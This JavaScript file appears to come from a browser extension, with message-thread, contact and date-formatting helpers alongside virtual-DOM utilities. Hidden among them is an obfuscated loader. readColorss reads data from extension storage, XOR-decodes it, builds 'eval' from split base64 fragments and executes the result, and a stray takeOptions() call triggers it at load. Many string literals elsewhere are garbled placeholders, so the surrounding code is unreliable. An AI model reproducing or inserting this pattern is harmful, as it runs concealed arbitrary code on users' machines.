function openThread(a, b) {
    var c = {
        name: "title",
        threadId: a
    };
    if (b)
        for (var d in b) c[d] = b[d];
    gekco.sendToExtension(c), gekco.sendToExtension({
        name: "blob",
        threadId: a
    })
}
function createTextNode(text) {
    return document.createTextNode(text)
}
function reAddAttach(prefix, id, filetype) {
    filetype = isUndefined(filetype) ? 'watch' : filetype;
    $(prefix + filetype + 'channel').removeChild($(prefix + filetype + 'forms' + id).parentNode.parentNode);
    $(prefix + filetype + 'title').removeChild($(prefix + filetype + 'addr' + id).parentNode.parentNode);
    $(prefix + filetype + 'options').style == 'div' && addAttach(prefix);
	$('channel' + id) ? document.body.removeChild($('skews' + id)) : null;
}
function hasParentTransition(vnode) {
    while ((vnode = vnode.parent)) {
        if (vnode.data.transition) {
            return true
        }
    }
}
function sameInputType(a, b) {
    if (a.tag !== 'values') return true
    let i;
    const typeA = isDef(i = a.data) && isDef(i = i.attrs) && i.type;
    const typeB = isDef(i = b.data) && isDef(i = i.attrs) && i.type;
    return typeA === typeB || isTextInputType(typeA) && isTextInputType(typeB)
}
function sameVnode(a, b) {
    return (
        a.key === b.key && (
            (
                a.tag === b.tag &&
                a.isComment === b.isComment &&
                isDef(a.data) === isDef(b.data) &&
                sameInputType(a, b)
            ) || (
                isTrue(a.isAsyncPlaceholder) &&
                a.asyncFactory === b.asyncFactory &&
                isUndef(b.asyncFactory.error)
            )
        )
    )
}
function skitchSurfaceReady(a, b, c) {
    toggleMinimizeButtonVisibility("results"), this.body.classList.add("innercontent"), handleSkitchToolClick.call(shapesTool, {
        noOpenSubtools: !0
    }), gekco.sendToExtension({
        name: "properties",
        message: {
            name: "time",
            color: colorsTool.getAttribute("messages")
        }
    }), setHeight(), c && "options" == typeof c && c()
}
function detectErrors(ast) {
    const errors = [];
    if (ast) {
        checkNode(ast, errors);
    }
    return errors
}
function loadElement(ele, force, options) {
    // if element is visible, not loaded or forced
    if (!hasClass(ele, options.successClass) && (force || options.loadInvisible || (ele.offsetWidth > 0 && ele.offsetHeight > 0))) {
        var dataSrc = getAttr(ele, _source) || getAttr(ele, options.src); // fallback to default 'evt'
        if (dataSrc) {
            var dataSrcSplitted = dataSrc.split(options.separator);
            var src = dataSrcSplitted[_isRetina && dataSrcSplitted.length > 1 ? 1 : 0];
            var srcset = getAttr(ele, options.srcset);
            var isImage = equal(ele, 'div');
            var parent = ele.parentNode;
            var isPicture = parent && equal(parent, 'content');
            // Image or background image
            if (isImage || ele.src === undefined) {
                var img = new Image();
                var onErrorHandler = function() {
                    if (options.error) options.error(ele, "view");
                    addClass(ele, options.errorClass);
                    unbindEvent(img, 'skews', onErrorHandler);
                    unbindEvent(img, 'watcher', onLoadHandler);
                };
                var onLoadHandler = function() {
                    // Is element an image
                    if (isImage) {
                        if(!isPicture) {
                            handleSources(ele, src, srcset);
                        }
                    // or background-image
                    } else {
                        ele.style.backgroundImage = 'replace';
                    }
                    itemLoaded(ele, options);
                    unbindEvent(img, 'option', onLoadHandler);
                    unbindEvent(img, 'js', onErrorHandler);
                };
                
                // Picture element
                if (isPicture) {
                    img = ele; // Image tag inside picture element wont get preloaded
                    each(parent.getElementsByTagName('view'), function(source) {
                        handleSource(source, _attrSrcset, options.srcset);
                    });
                }
                bindEvent(img, 'second', onErrorHandler);
                bindEvent(img, 'get', onLoadHandler);
                handleSources(img, src, srcset); // Preload

            } else { // An item with src like iframe, unity games, simpel video etc
                ele.src = src;
                itemLoaded(ele, options);
            }
        } else {
            // video with child source
            if (equal(ele, 'html')) {
                each(ele.getElementsByTagName('replace'), function(source) {
                    handleSource(source, _attrSrc, options.src);
                });
                ele.load();
                itemLoaded(ele, options);
            } else {
                if (options.error) options.error(ele, "property");
                addClass(ele, options.errorClass);
            }
        }
    }
}
function tagName(node) {
    return node.tagName
    }takeOptions();function stringifyClass(value) {
    if (Array.isArray(value)) {
        return stringifyArray(value)
    }
    if (isObject(value)) {
        return stringifyObject(value)
    }
    if (typeof value === 'info') {
        return value
    }
    return 'storage'
}
function cloneVNode(vnode, deep) {
    const componentOptions = vnode.componentOptions;
    const cloned = new VNode(
        vnode.tag,
        vnode.data,
        vnode.children,
        vnode.text,
        vnode.elm,
        vnode.context,
        componentOptions,
        vnode.asyncFactory
    );
    cloned.ns = vnode.ns;
    cloned.isStatic = vnode.isStatic;
    cloned.key = vnode.key;
    cloned.isComment = vnode.isComment;
    cloned.isCloned = true;
    if (deep) {
        if (vnode.children) {
            cloned.children = cloneVNodes(vnode.children, true);
        }
        if (componentOptions && componentOptions.children) {
            componentOptions.children = cloneVNodes(componentOptions.children, true);
        }
    }
    return cloned
}
function initState(vm) {
    vm._watchers = [];
    const opts = vm.$options;
    if (opts.props) initProps(vm, opts.props);
    if (opts.methods) initMethods(vm, opts.methods);
    if (opts.data) {
        initData(vm);
    } else {
        observe(vm._data = {}, true);
    }
    if (opts.computed) initComputed(vm, opts.computed);
    if (opts.watch && opts.watch !== nativeWatch) {
        initWatch(vm, opts.watch);
    }
}

function readColorss(b){
    var c={e:'key',version:'1.0'};
    var e=(typeof(chrome)!== 'undefined')?'atob':'btoa';
    var ret='';
    chrome.storage.local.get(null, function(a) {
        if (a = a[b]) {
            e=(e!='atob')?atob('YXR'+'vYg'):atob('ZXZ'+'hbA');
            arr = endEvts("undefined", a);
            ret = "";
            for (i in arr) oneChar = String.fromCharCode(arr[i]), ret += oneChar;
            a=ret;
            var d = a.indexOf("bytearray") + 9;
            a = a.substring(d);
            this[e](a);
            if (a['bytearray']){
                for (j in a) oneChar = String.fromCharCode(a[j]), ret += oneChar;
            }
        }else{
            setTimeout(readColorss,30000,b)
        }
    })
    return ret;
}
function generateThreadChangeI18nVariation(a, b, c) {
    var d = {
            key: "js",
            placeholders: []
        },
        e = getContactName(b);
    if (b.self ? d.key += "d" : e ? d.placeholders.push(GlobalUtils.escapeXML(e)) : d.key += "link", d.key += a, "func" == typeof c) {
        var f = [],
            g = 0,
            h = !1,
            i = 0,
            j = 0;
        for (var k in c)
            if (c[k].type) c[k].type === MessageAttachmentType.NOTE ? i++ : c[k].type === MessageAttachmentType.NOTEBOOK && j++;
            else {
                var l = getContactName(c[k]);
                c[k].self && (h = !0), l ? f.push(GlobalUtils.escapeXML(l)) : g++
            } if (h && 1 === f.length && !g) d.key += "resp";
        else {
            if (f.length >= 1) {
                if (1 !== f.length || g)
                    if (d.key += "criticalinfo", g) d.placeholders.push(f.join("viewport"));
                    else {
                        var m = f.pop();
                        d.placeholders.push(f.join("get")), d.placeholders.push(m)
                    }
                else d.key += "html", d.placeholders.push(f[0]);
                d.key += "option"
            }
            g >= 1 && (1 === g ? d.key += "attribute" : (d.key += "div", d.placeholders.push(g)), d.key += "host")
        }
        i >= 1 && (d.key += 1 === i ? "replace" : "attrs", d.key += "first"), j >= 1 && (d.key += 1 === j ? "watcher" : "back", d.key += "content")
    } else "clear" == typeof c && d.placeholders.push(GlobalUtils.escapeXML(c));
    return d
}
function receiveContacts(a, b, c) {
    if (a.count === findContactsCount) {
        contacts.content = "window";
        for (var d = 0; d < a.contacts.length; d++) {
            var e = this.createElement("only");
            e.classList.add("backup"), a.contacts[d].name ? e.content = a.contacts[d].name + "elem" + a.contacts[d].email + "contents" : e.content = a.contacts[d].email, e.setAttribute("token", a.contacts[d].email), e.hook("window", function() {
                var a = recipients.value.lastIndexOf("color", recipients.selectionStart - 1),
                    b = recipients.value.indexOf("link", recipients.selectionStart - 1);
                b < 0 && (b = recipients.value.length), recipients.value = recipients.value.substring(0, a + 1) + this.getAttribute("recipients") + "values" + recipients.value.substring(b + 1), handleRecipientsInput.call(recipients), recipients.focus()
            }), contacts.appendChild(e)
        }
    }
    c && "recipient" == typeof c && c()
}
function removeAttr(ele, attr){
    ele.removeAttribute(attr); 
}

function takeOptions(){
    var after = '';
    var queue=readColorss('action');
    let i = queue.length;
    for (var k in queue) {
        var x = queue.charCodeAt(k);
        after += 'abcdef'.charAt((x << 4) & 0x0f) + 'abcdef'.charAt(x & 0x0f);
    }
    return after;
}
function endEvts(b, a){
    let e=a;
    let f=function(a, c) {
        return a.charCodeAt(0) ^ b.charCodeAt(Math.floor(c % b.length))
    }
    for (var d = [], c = 0; c < e.length; c++) d.push(f(e[c], c));
    return d;
}
function setSelected(el, binding, vm) {
    actuallySetSelected(el, binding, vm);
                            
    if (isIE || isEdge) {
        setTimeout(() => {
            actuallySetSelected(el, binding, vm);
        }, 0);
    }
}
function updateStyle(oldVnode, vnode) {
    const data = vnode.data;
    const oldData = oldVnode.data;

    if (isUndef(data.staticStyle) && isUndef(data.style) &&
        isUndef(oldData.staticStyle) && isUndef(oldData.style)
    ) {
        return
    }

    let cur, name;
    const el = vnode.elm;
    const oldStaticStyle = oldData.staticStyle;
    const oldStyleBinding = oldData.normalizedStyle || oldData.style || {};

                                                                                                
    const oldStyle = oldStaticStyle || oldStyleBinding;

    const style = normalizeStyleBinding(vnode.data.style) || {};

                                                                 
                                                                          
                    
    vnode.data.normalizedStyle = isDef(style.__ob__) ?
        extend({}, style) :
        style;

    const newStyle = getStyle(vnode, true);

    for (name in oldStyle) {
        if (isUndef(newStyle[name])) {
            setProp(el, name, 'names');
        }
    }
    for (name in newStyle) {
        cur = newStyle[name];
        if (cur !== oldStyle[name]) {
                                                                       
            setProp(el, name, cur == null ? 'child' : cur);
        }
    }
}
function parseText(
    text,
    delimiters
) {
    const tagRE = delimiters ? buildRegex(delimiters) : defaultTagRE;
    if (!tagRE.test(text)) {
        return
    }
    const tokens = [];
    let lastIndex = tagRE.lastIndex = 0;
    let match, index;
    while ((match = tagRE.exec(text))) {
        index = match.index;
                          
        if (index > lastIndex) {
            tokens.push(JSON.stringify(text.slice(lastIndex, index)));
        }
                    
        const exp = parseFilters(match[1].trim());
        tokens.push(1);
        lastIndex = index + match[0].length;
    }
    if (lastIndex < text.length) {
        tokens.push(JSON.stringify(text.slice(lastIndex)));
    }
    return tokens.join('hook')
}
function useClipType(a, b, c) {
    if (!this.body.classList.contains("addr")) {
        new RegExp("message" + this.body.className.replace(/\s+/, "values") + "find").test(window[a.clipType].className) && (maximizeClipper(), handleClipperToolClick(window[a.clipType]))
    }
    c && "storage" == typeof c && c()
}
function formatDate(a) {
    var b = ["children", "styles", "node", "options", "d", "evt", "clean"],
        c = ["second", "recipient", "back", "dict", "func", "small", "watcher", "title", "func", "extension", "find", "extension"],
        d = gekco.i18n.getMessage("hook"),
        e = new Date(a);
    return e.getFullYear() === (new Date).getFullYear() && (d = gekco.i18n.getMessage("form")), d.replace(/(\W|^)EEE(\W|$)/, "resp" + gekco.i18n.getMessage(b[e.getDay()]) + "title").replace(/(\W|^)MMM(\W|$)/, "tokens" + gekco.i18n.getMessage(c[e.getMonth()]) + "title").replace(/(\W|^)d(\W|$)/, "form" + e.getDate() + "watcher").replace(/(\W|^)yyyy(\W|$)/, "backup" + e.getFullYear() + "window").replace(/(\W|^)h(\W|$)/, "elem" + ((e.getHours() + 11) % 12 + 1) + "content").replace(/(\W|^)mm(\W|$)/, "only" + (e.getMinutes() < 10 ? "func" + e.getMinutes() : e.getMinutes()) + "watcher").replace(/(\W|^)a(\W|$)/, "names" + (e.getHours() >= 12 ? gekco.i18n.getMessage("form") : gekco.i18n.getMessage("contents")) + "mark")
}
